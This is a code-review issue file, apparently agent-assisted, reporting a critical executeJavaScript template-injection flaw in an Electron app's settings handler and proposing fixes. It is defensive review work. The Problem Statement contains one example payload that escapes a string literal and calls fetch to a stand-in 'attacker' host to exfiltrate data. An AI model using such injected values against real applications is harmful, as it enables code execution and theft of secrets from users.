---
status: pending
priority: p1
issue_id: 001
tags: [code-review, security, ipc, electron]
pr: 20
agents:
  - security-sentinel
  - architecture-strategist
  - kieran-typescript-reviewer
  - agent-native-reviewer
---

# `executeJavaScript` template-injection in `settings:open`

## Problem Statement

`apps/desktop/src/main/handlers/settings-handlers.ts:120-124` interpolates
`req.page` directly into a JS string literal that is then executed in the
privileged Settings renderer:

```ts
existing.webContents.executeJavaScript(
  `window.location.hash = "stage=settings&page=${req.page}";`,
  true
);
```

`req.page` is typed `SettingsPage` (a string-literal union), but the bus
accepts whatever the transport delivers. Today the only transport is
`principal: "ipc"`; tomorrow Phase 7 adds HTTP RPC and Phase 8 adds MCP.
A compromised or future-transport caller sending
`req.page = "x\";fetch(\"https://attacker/x?k=\"+...);//"` executes
arbitrary JS in the Settings renderer — which has IPC access to every
verb on the bus including `settings:secretStatus` and the masked secret
status.

This is also the only main→renderer signal in the codebase that bypasses
the typed event-channel pattern (`webContents.send(EVENT_CHANNELS.*, payload)`).
It leaks the renderer's DOM model into the bus contract and breaks
agent-native parity — HTTP/MCP callers can't `executeJavaScript`.

## Findings

- **Severity:** P1 (CRITICAL). Blocks merge.
- **Surface:** `apps/desktop/src/main/handlers/settings-handlers.ts:113-137`
- **Why now, not later:** the bus is the trust boundary for future
  transports per the buildout plan. Fixing it now keeps every future
  transport safe by default.

## Proposed Solutions

### Option A — Replace with typed event broadcast (recommended)
Add `EVENT_CHANNELS.settingsNavigate` (channel name `events:settings:navigate`)
with payload `{ page: SettingsPage }`. The renderer subscribes via
`useActivePage` or a sibling hook and updates the hash itself.

- **Pros:** Eliminates the eval surface entirely. Transport-agnostic.
  Matches the established broadcast pattern in the codebase.
- **Cons:** ~30 LOC across protocol/ipc/handler/renderer hook.
- **Effort:** Small.
- **Risk:** Low.

### Option B — Strict allowlist + JSON.stringify
Validate `req.page ∈ SETTINGS_PAGE_IDS` (already exported from
`settings-categories.ts`) and use `JSON.stringify(req.page)` inside the
template literal.

- **Pros:** Two-line fix.
- **Cons:** Still uses `executeJavaScript` (footgun), still leaks DOM
  into the bus contract.
- **Effort:** Tiny.
- **Risk:** Low.

## Recommended Action

Option A. The cost is small and it removes a class of bugs.

## Affected Files

- `apps/desktop/src/main/handlers/settings-handlers.ts` (replace executeJavaScript)
- `packages/shared/src/ipc.ts` (add channel constant + payload type)
- `apps/desktop/src/renderer/src/features/settings/useActivePage.ts` (subscribe + setActivePage on event)

## Acceptance Criteria

- [ ] `executeJavaScript` removed from `settings-handlers.ts`.
- [ ] New `EVENT_CHANNELS.settingsNavigate` channel constant in `@pwrsnap/shared/ipc`.
- [ ] Handler emits the event when `req.page` is supplied and an existing window is focused.
- [ ] `useActivePage` (or a new sibling subscribe) flips the URL hash on receipt.
- [ ] Unit test: dispatch `settings:open { page: "ai" }` with an existing window → asserts event fired with `page: "ai"`; with no window → asserts hash baked into createSettingsWindow URL.
- [ ] No string-interpolation of bus payloads into JS anywhere in the new handlers.
